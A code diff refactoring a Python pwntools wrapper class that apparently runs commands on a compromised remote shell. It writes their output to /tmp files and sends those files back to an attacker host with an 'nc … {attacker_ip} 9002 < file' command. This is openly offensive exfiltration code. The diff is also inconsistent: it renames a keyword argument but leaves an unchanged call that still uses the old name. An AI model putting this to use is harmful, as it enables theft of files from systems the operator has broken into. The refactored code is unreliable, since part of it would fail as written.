@@ -11,37 +11,37 @@ class PwnlibSocketWrapper:
         self.encoding = 'utf-8'
         self.remote_output_folder = '/tmp/'
         self.netcat_file_transfer_port = 9002
+        self.newline_bytes = b'\n'
 
-    def ignore_until_prompt(self):
+    def send_command_read_output(self, command_bytes: bytes, expect_single_line_output=False) -> str:
         self.client.recvuntil(self.expected_prompt)
-
-    def send_command_read_output(self, command_bytes: bytes, single_line_output=False) -> str:
-        self.ignore_until_prompt()
         self.client.sendline(command_bytes)
-        self.client.recvuntil(command_bytes + b'\n')
+        self.client.recvuntil(command_bytes + self.newline_bytes)
 
         output = ''
         while True:
-            output_line = self.client.recvuntil(b'\n', timeout=self.timeout).decode(self.encoding)
+            output_line = self.client.recvuntil(self.newline_bytes, timeout=self.timeout).decode(self.encoding)
             output += output_line
 
-            if not output_line or single_line_output:
+            if not output_line or expect_single_line_output:
                 break
 
         return output.strip()
 
-    def send_command_temporary_file(self, command_bytes: bytes) -> str:
-        hash_str = hashlib.md5(command_bytes).hexdigest()
-        output_remote_temporary_file = self.remote_output_folder + hash_str
+    def send_command_redirected_to_temporary_file(self, command_bytes: bytes) -> str:
+        _hash = hashlib.md5(command_bytes).hexdigest()
+        output_remote_temporary_file = self.remote_output_folder + _hash
 
         if self.remote_file_exists(output_remote_temporary_file):
             return output_remote_temporary_file
 
-        command_bytes = f'{command_bytes.decode(self.encoding)} > {output_remote_temporary_file}'.encode()
-        self.client.sendline(command_bytes)
+        command_str = command_bytes.decode(self.encoding)
+        redirected_command_bytes = f'{command_str} > {output_remote_temporary_file} 2>&1'.encode()
+        self.client.sendline(redirected_command_bytes)
+
         return output_remote_temporary_file
 
-    def download_remote_file(self, remote_path: str) -> str:
+    def read_remote_file(self, remote_path: str) -> str:
         download_command = f'nc -w 3 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
         self.client.sendline(download_command)
 
@@ -60,7 +60,7 @@ class PwnlibSocketWrapper:
         output = self.send_command_read_output(file_exists_command, single_line_output=True)
         return 'No such file or directory' not in output and ': empty' not in output
 
-    def send_command_read_cached_temporary_file(self, command_bytes: bytes) -> str:
-        remote_temporary_file = self.send_command_temporary_file(command_bytes)
-        output = self.download_remote_file(remote_temporary_file)
+    def send_command_read_output_through_temporary_file(self, command_bytes: bytes) -> str:
+        remote_temporary_file = self.send_command_redirected_to_temporary_file(command_bytes)
+        output = self.read_remote_file(remote_temporary_file)
         return output
